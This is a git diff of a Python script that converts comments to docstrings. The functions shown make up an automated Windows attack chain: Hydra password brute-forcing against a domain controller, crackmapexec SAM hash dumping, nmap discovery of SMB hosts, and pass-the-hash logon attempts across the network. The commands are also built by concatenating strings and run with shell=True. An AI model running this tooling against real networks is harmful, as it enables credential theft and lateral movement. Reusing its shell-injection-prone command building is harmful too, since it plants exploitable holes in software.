@@ -8,30 +8,51 @@ import subprocess
 import sys
 
 
-# Step 0.5: Use Hydra to get a working password given a user account and domain IP address
-# ip: a string IP address for the domain controller
-# username: string (for the above IP)
-# dictionary: a txt file of passwords to try with the username above
-# Returns: a string containing a working password for the above username
 def hydraPass(ip, username, dictionary):
+    """Retrieve password for username in domain controller using hydra
+
+    Args:
+        ip (str): IP Address of the domain controller
+        username (str): username to crack password of
+        dictionary (str): Path to dictionary text file to try passwords
+            Text file should have one password per line
+
+    Returns:
+        str: String password for the username
+
+    """
     command = 'hydra -l '+ username + ' -P ' + dictionary + ' smb://' + ip + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^password:$/{print $7}'"""
     return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
 
 
-# Step 1: use crackmapexec to do a SAM grab
-# ip: a string IP address for the domain controller
-# username: string (for the above IP)
-# password: string (for the above IP)
-# Returns: a list where each element is the formatted username and hash
 def samGrab(ip, username, password):
+    """Build list of usernames and hashes using crackmapexec
+
+    Args:
+        ip (str): IP address of the domain controller
+        username (str): username to log in
+        password (str): password to log in
+
+    Returns:
+        [str]: list of username and hash pairs as strings in
+            crackmapexec format
+
+    """
     command = 'crackmapexec --sam ' + ip + ' -u ' + username + ' -p ' + password + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^.*:::$/{print $6}'"""
     return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
 
 
-# Step 2: use nmap to find windows machines on the network
-# ip: a string IP address (potentially containing ranges) for the network
-# Returns: a list of Windows IP addresses
 def osFingerprint(ipRange):
+    """Fingerprint machines in ip range using nmap
+
+    Args:
+        ipRange (str): String ip address that can specify ranges
+            ex. 10.202.208.2 or 10.202.208.2-30
+
+    Returns:
+        [str]: list of ip addresses in range running Windows
+
+    """
     command = 'nmap -p 445 --open ' + ipRange
     output = subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
     output = output[2:]
@@ -62,11 +83,18 @@ def osFingerprint(ipRange):
     return result
 
 
-# Step 3: use crackmapexec to try and log on to the windows machines
-# hashes: the correctly formatted (List of tuples) hashes from the SAM grab
-# ips: list of windows IPs found in step 2
-# Returns: a dictionary mapping each windows IP to the result of trying to log on to that system (success/fail, root/not root)
 def attemptLogon(hashes, ips):
+    """Attempt login to other windows machines using crackmapexec
+
+    Args:
+        hashes ([(str, str)]): list of formatted username, hash tuples
+        ips ([str]): list of ip address running windows
+
+    Returns:
+        {str: str}: dictionary mapping each ip to its login result
+            result can be success/fail as well as root/nonroot
+
+    """
     results = {}
     for ip in ips:
         for username, hash in hashes:
@@ -79,9 +107,16 @@ def attemptLogon(hashes, ips):
     return results
 
 
-# input: list of hashes
-# output: List of tuples (username, hash) for use in crackmapexec logon attempts
 def formatCrackmapSam(hashes):
+    """Format crackmapexec output into usuable data structures
+
+    Args:
+        hashes ([str]): list of username, hash pairs seperated by ':'
+
+    Returns:
+        [(str, str)]: list of username, hash tuples
+
+    """
     result = []
     for hash in hashes:
         username = ""
@@ -97,7 +132,15 @@ def formatCrackmapSam(hashes):
 
 
 def check_executables(executables):
-    """Check if required programs are present on system before continuing"""
+    """Check if required programs are present on system before continuing
+
+    Args:
+        executables ([str]): list of exectuable names needed at runtime
+
+    Returns:
+        [str]: list of exectuable names that could not be found
+
+    """
     not_found = []
     for executable in executables:
         if shutil.which(executable) == None:
